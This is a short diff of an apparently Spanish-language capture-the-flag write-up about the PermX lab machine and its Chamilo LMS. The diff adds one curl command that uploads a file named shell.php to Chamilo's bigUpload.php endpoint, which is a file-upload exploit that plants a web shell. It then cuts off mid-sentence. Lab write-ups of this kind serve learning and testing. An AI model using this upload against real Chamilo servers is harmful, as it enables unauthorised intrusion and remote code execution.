@@ -55,5 +55,12 @@ hemos conseguido un LMS llamado chamilo así que intentaremos buscar alguna vuln
 |                |                                 |      |       |                                                                                    |
 |                |                                 |      |       |                                                                                    |
 
+```python
+
+curl -F 'bigUploadFile=@shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
+
+```
+
+de esta forma vamos a 
 ![[Pasted image 20240712140505.png]]
 
